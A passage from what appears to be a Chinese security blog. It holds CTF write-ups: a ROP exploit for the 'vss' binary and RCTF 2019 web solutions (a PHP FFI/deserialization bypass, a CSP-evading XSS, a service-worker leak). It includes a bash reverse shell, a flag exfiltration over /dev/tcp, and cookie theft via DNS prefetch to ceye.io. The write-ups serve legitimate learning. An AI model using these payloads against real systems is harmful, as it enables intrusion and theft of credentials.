ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045f2a5</span>) <span class="comment"># syscall ; ret</span></span><br><span class="line">addRspRet = <span class="number">0x000000000046f205</span></span><br><span class="line">payload = <span class="string">'py'</span>+<span class="string">'a'</span>*(<span class="number">0x48</span><span class="number">-0x2</span>)+p64(addRspRet)+<span class="string">'a'</span>*(<span class="number">0x58</span><span class="number">-0x50</span>)+p</span><br><span class="line">p = process(<span class="string">'vss'</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.recvuntil(<span class="string">":\n"</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这也是第一次能直接用ROPgadget直接生成rop链，23333。</p><p>如果考虑手工构造的话，这里没有<code>write</code>，所以也不能泄露地址，libc的binsh是没有办法了，只能依靠<code>read</code>来读入binsh的数据，然后调用syscall来执行shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">"./vss"</span>)</span><br><span class="line"></span><br><span class="line">vss = ELF(<span class="string">"./vss"</span>)</span><br><span class="line"></span><br><span class="line">rsi_ret = <span class="number">0x401937</span></span><br><span class="line">rdi_ret = <span class="number">0x401823</span></span><br><span class="line">rdx_ret = <span class="number">0x43ae05</span></span><br><span class="line">xor_rax_ret = <span class="number">0x41bd1f</span></span><br><span class="line">addRspRet = <span class="number">0x46f205</span></span><br><span class="line">syscall = <span class="number">0x437eae</span></span><br><span class="line"><span class="comment">#syscall = 0x45f2a5</span></span><br><span class="line">rax_ret = <span class="number">0x46f208</span></span><br><span class="line">bss_base = vss.bss()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'py'</span> + <span class="number">0x46</span>*<span class="string">'a'</span></span><br><span class="line">payload += p64(addRspRet)</span><br><span class="line">payload += <span class="number">8</span>*<span class="string">'a'</span></span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rsi_ret)</span><br><span class="line">payload += p64(bss_base)</span><br><span class="line">payload += p64(rdx_ret)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(xor_rax_ret)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += p64(rax_ret)</span><br><span class="line">payload += p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(bss_base)</span><br><span class="line">payload += p64(rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> sh.recvuntil(<span class="string">":\n"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#time.sleep(1)</span></span><br><span class="line">sh.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>学习完基本的ROP之后，也算是理解了其中的一些常规套路，有write和puts之类的有输出函数是可以泄露地址的，拿到地址配合libc就可以去计算我们想调用的函数地址。如果不能拿到地址，就利用ROP链来构造syscall，其中binsh的值可以用read来写入空闲区块，一般是bss段。</p><p>最后一道题vss，也学到很多分析静态链接程序的技巧受用很多，比如在分析main函数的时候可以用入口点的特征也可以用字符串的交叉引用（交叉引用是个好东西，很多时候解决很多麻烦）。同时学会了一点花式栈溢出技巧，劫持栈指针到我们可控的区域中来执行指令。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近开始入门pwn，在白泽新手oj那里学了一波之后开始自己学剩下的内容。看到atum大佬推荐的三道基础ROP题目，就练习一下，学习思路总结经验。在网上找题的过程中发现vss基本上绝迹了。。。辛苦一番之后终于找到，为了后面的人也能快速找到题目我就把三道题一起上传了。&lt;/p&gt;

      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="ROP" scheme="https://hurricane618.me/tags/ROP/"/>
    
      <category term="stackoverflow" scheme="https://hurricane618.me/tags/stackoverflow/"/>
    
  </entry>
  
  <entry>
    <title>2019RCTF 部分Web的WriteUp</title>
    <link href="https://hurricane618.me/2019/05/24/2019rctf-some-writeup/"/>
    <id>https://hurricane618.me/2019/05/24/2019rctf-some-writeup/</id>
    <published>2019-05-24T02:23:17.000Z</published>
    <updated>2019-05-24T02:23:17.544Z</updated>
    
    <content type="html"><![CDATA[<p>一年一度的RCTF开始了，又能学一波骚操作，RCTF的web题目去年就非常好，今年也特别出色。由于研究所月赛的原因没有参与其中，所以赛后来复现一下。</p><h2 id="nextphp"><a href="#nextphp" class="headerlink" title="nextphp"></a>nextphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]); </span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个代码执行，但是肯定没有这么简单，执行phpinfo查看到<code>disable_function</code>之后，发现禁用了已知范围内的所有危险函数，并且还把之前考差过的<code>putenv</code>也禁用了。这样就没有办法使用<code>LD_PRELOAD</code>来劫持执行命令了。 </p><p>同时也检查了一下其他方面，有没有使用什么危险的后端组件，也是全部GG。没有php-fpm，没有mog_cgi，没有ImageMagick等等。 </p><p>一筹莫展之际，林师傅提醒到可以扫描文件看看，所以果断看看路径上有些啥。通过phpinfo可以得到web路径，使用php函数来打开路径读取内容即可。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=var_dump(glob(&quot;/var/www/html/*&quot;));</span><br><span class="line">array(2) &#123; [0]=&gt; string(23) &quot;/var/www/html/index.php&quot; [1]=&gt; string(25) &quot;/var/www/html/preload.php&quot; &#125;</span><br></pre></td></tr></table></figure><p>可以看到里面除了<code>index.php</code>以外，还有一个神奇的<code>preload.php</code>，读取其中的内容看看。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=var_dump(file_get_contents(&quot;/var/www/html/preload.php&quot;));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>里面是一个继承序列化类的自定义类，同时在phpinfo中看到它被<code>opcache.preload</code>预加载了。 </p><p>感觉这里是有突破口的，搜了一圈发现只有php文档有资料，当时没有什么空就放弃了。 </p><p>看了zsx大佬的<a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/nextphp" target="_blank" rel="noopener">writeup</a>之后，发现这个php是7.4的开发版本，开发版经常会有新特性，这里就是利用一个新特性<code>FFI-Foreign Function Interface</code>，中文叫外部函数接口。 </p><p>利用这个我们可以引用被禁用的函数，但是由于<code>__set</code>被设置成报错，所以没有办法对<code>$data</code>赋值。所以这里需要调用<code>__unserialize</code>，这里又有一个新机制，在这个类即继承了反序列化类，又拥有<code>__serialize()/__unserialize()</code>，就会优先执行这种方法。 </p><p>所以我们只需要构造一个类，先正常序列化，修改成<code>class A</code>，然后再反序列化，这样就会覆盖原始的值，同时并不是直接赋值，所以也不会触发<code>__set</code>。最后，利用ffi引入命令执行函数，执行命令反弹shell。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(const char *command);'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> D();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">$b = str_replace(<span class="string">'"D"'</span>, <span class="string">'"A"'</span>, $b);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br><span class="line"><span class="comment">//$d = unserialize($b);</span></span><br><span class="line"><span class="comment">//$d-&gt;ret-&gt;system('bash -i &gt;&amp; /dev/tcp/xxxx/8080 0&gt;&amp;1');</span></span><br></pre></td></tr></table></figure><p>这样就把反序列化数据带入最后两行，在远程服务端执行，就可以了。但是这中间有一个坑，就是没有办法反弹shell，只能一次一次的执行命令后回传到vps主机上。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$d-&gt;ret-&gt;system(&apos;bash -c &quot;cat /flag &gt; /dev/tcp/xxxx/xxxx&quot;&apos;);</span><br></pre></td></tr></table></figure><img src="/2019/05/24/2019rctf-some-writeup/1.jpg"><h2 id="jail"><a href="#jail" class="headerlink" title="jail"></a>jail</h2><p>漏洞点比较直接，在post区域中没有任何过滤，可以任意输入，是一个存储型xss，但是奈何有csp。 </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">content-security-policy</span>: sandbox allow-scripts allow-same-origin; base-uri 'none';default-src 'self';script-src 'unsafe-inline' 'self';connect-src 'none';object-src 'none';frame-src 'none';font-src data: 'self';style-src 'unsafe-inline' 'self';</span><br></pre></td></tr></table></figure><p>由于有沙盒，所以没有办法正常外连传输数据，同时由于有banner导致没有办法自动跳转，这里思路有这么几个。 </p><ol><li><p>一般这种连接是没有限制dns查询的，所以可以使用dns外带数据，这里的方法主要是<code>&lt;link rel=&quot;dns-prefetch&quot; href=xxxxx.xxxxx.xxxx&gt;</code>，这样在dns记录中就可以查到我们想要的数据。 </p></li><li><p>利用某些服务机制绕过csp的策略，zsx的writeup中介绍了两种，一个是WebRTC服务会忽略<code>connect-src</code>，<a href="https://github.com/w3c/webrtc-pc/issues/1727" target="_blank" rel="noopener">https://github.com/w3c/webrtc-pc/issues/1727</a>。另外一种是利用service worker，这个是js在浏览器注册的一种持续化的服务，这个服务会优先使用它自己的csp策略，所以直接传输空的csp策略就可以绕过。 </p></li></ol><p>由于这道题目是直接开启了script的<code>unsafe-inline</code>，所以是可以直接上script标签的。这里是直接用最简单的dns外带数据的方法。 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toHex</span>(<span class="params">s</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">        val += s.charCodeAt(i).toString(<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line">c = <span class="built_in">document</span>.cookie.split(<span class="string">";"</span>);</span><br><span class="line">head = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"HEAD"</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;c.length;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> t = c[i];</span><br><span class="line">    <span class="keyword">if</span> (t.indexOf(<span class="string">"flag="</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">        t = toHex(t.split(<span class="string">"="</span>)[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">var</span> tt =t.substr(j*<span class="number">20</span>,<span class="number">20</span>);</span><br><span class="line">            <span class="keyword">if</span> (tt.length == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            head.innerHTML = head.innerHTML + <span class="string">"&lt;link rel=\"dns-prefetch\" href=\"//v_"</span>+j+<span class="string">"_"</span> + tt+  <span class="string">".flag.xxxxxx.ceye.io\"&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将dns外带数据传给ceye，一个dns的log平台，收到数据之后hex解码即可得到flag。 </p><img src="/2019/05/24/2019rctf-some-writeup/2.jpg"><p>当然预期解法是service worker，这里通过文件上传js，然后在post处引用。因为service worker机制的问题，可以绕过原来的csp设置。顺带一提，必须要是https才行。 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">'https://YOUR_DOMAIN/?'</span> + <span class="built_in">encodeURIComponent</span>(globalThis.location.href), &#123;<span class="attr">mode</span>: <span class="string">'no-cors'</span>&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> navigator.serviceWorker.register(<span class="string">'/uploads/21ca75a36c5cdacfd4653fadb2553242.js?'</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.cookie), &#123;<span class="attr">scope</span>: <span class="string">'/uploads/'</span>&#125;); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><p>延续上一道题目的环境，只不过这次需要获取管理员的密码。是一道很有意思的题目，看完题解之后，发现它是利用密码管理软件的自动提示功能来获得密码。</p><p>这里只能通过service worker来完成，首先看到提示之后去读取<code>document.body.innerHTML</code>，可以拿到一些有趣的数据，在里面可以看到有cip这个单词，查询之后知道是chromeipass。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;navigator.serviceWorker.register(<span class="string">'/uploads/511b3c8839bd36230c4aa3c5ff5545ef.js?'</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.body.innerHTML), &#123;<span class="attr">scope</span>:<span class="string">'/uploads/'</span>&#125;);&#125;, <span class="number">1000</span>) </span><span class="tag">&lt;/<span 